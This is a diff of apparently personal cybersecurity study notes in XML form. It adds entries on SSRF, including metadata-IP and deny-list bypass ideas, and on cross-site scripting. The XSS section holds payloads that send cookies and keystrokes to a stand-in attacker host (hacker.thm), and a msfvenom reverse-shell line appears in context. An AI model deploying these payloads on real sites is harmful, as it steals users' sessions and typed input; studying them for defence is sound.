@@ -7790,7 +7790,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shik
 </rich_text>
       </node>
     </node>
-    <node name="Web Fundamentals" unique_id="251" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1708057899" ts_lastsave="1710128877">
+    <node name="Web Fundamentals" unique_id="251" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1708057899" ts_lastsave="1710373343">
       <node name="Walking an application" unique_id="252" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="152" is_bold="0" foreground="" ts_creation="1708057929" ts_lastsave="1708309278">
         <rich_text>Introduction
 - manually review a web app for security issues
@@ -8029,7 +8029,7 @@ Remedetion
 is possible change the method with burpsuite
 </rich_text>
       </node>
-      <node name="Intro to SSRF" unique_id="260" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="152" is_bold="0" foreground="" ts_creation="1710128877" ts_lastsave="1710185257">
+      <node name="Intro to SSRF" unique_id="260" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="152" is_bold="0" foreground="" ts_creation="1710128877" ts_lastsave="1710292179">
         <rich_text>what is
 - is server-side request forgery
 - allows a molicious user to cause webserver to make an additional or edited http request
@@ -8038,7 +8038,39 @@ is possible change the method with burpsuite
    → access to unauthorised areas
    → access to customer/organisational data
    → ability to scale to internal networks
-   → reveral authentication tokens/credentials</rich_text>
+   → reveral authentication tokens/credentials
+
+Finding an SSRF
+- is possible found in many different ways
+   → using in a parameter in the address bar
+   → a hidden field in a form
+   → a partial URL such as just the hostname
+   → perhaps only the path of the URL
+- tools to http logging: requestbin.com, own HTTP server or burp suite
+
+Defeating common SSRF defenses
+- implement checks in their apps to make sure the requested reource meets specific rules
+- use of Deny List, list or matching a particular pattern
+- block 169.254.169.254, which contains metadata for the deployed cloud server, including possiblly sensitive information
+- allow list, where all requests get denied unless they appear on a lust or match a particular pattern
+- Open redirect, is an endpoint on the server where the website visitor gets automatically redirected to another website address</rich_text>
+      </node>
+      <node name="Cross-site Scripting" unique_id="261" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1710373343" ts_lastsave="1710374291">
+        <rich_text>Introduction
+- XSS is based on JS
+- injection attack where malicious JS gets injected into a web app with the intetion of being executed by other users
+
+XSS Payloads
+- is code that wish to be executed on the targets computer
+- there are two parts, the intention and the modification
+- Proof of concept
+   → is the simplest of payloads, is used to check: &lt;script&gt;alert('XSS');&lt;/script&gt;
+- Session stealing
+   → details of a user's session, such as login tokens: &lt;script&gt;fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));&lt;/script&gt;
+- key logger:
+   → acts like keylogger. all typed in the webpage will be forwarded to a website under the hacker's control: &lt;script&gt;document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) ); }&lt;/script&gt;
+- Business Logic
+   → is more specific, would be about calling a particular network resource or a JS function: &lt;script&gt;u</rich_text>
       </node>
     </node>
     <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
@@ -17700,7 +17732,7 @@ estados de hilos:
 </rich_text>
       <rich_text scale="h3" foreground="#eff3f8">Qué lenguaje introdujo el concepto de "código intermedio"?</rich_text>
     </node>
-    <node name="Lua" unique_id="254" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1708538520" ts_lastsave="1708970331">
+    <node name="Lua" unique_id="254" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1708538520" ts_lastsave="1710295597">
       <rich_text>Lexical Conventios
 - not beging with numbers, string of letters, digits and underscores
 - with _{uppercase} is reserved to special cases
@@ -17745,7 +17777,13 @@ Functions
 - definition is with function {name} ({argument}) {body} end
 - is possible return multiple values like a tuple
 - variadic fucntions, variable number of parameters, using (...), to use multiple variables
-- ipairs returns two values, the index and the value</rich_text>
+- ipairs returns two values, the index and the value
+
+
+Games
+- install imagemagick
+- convert {image} -geometry 16x16 -colors 8 -unique-colors -scale 4000% ~/scheme.png
+- display ~/scheme.png</rich_text>
     </node>
   </node>
   <node name="Crecimiento personal" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617947184" ts_lastsave="1684703124">
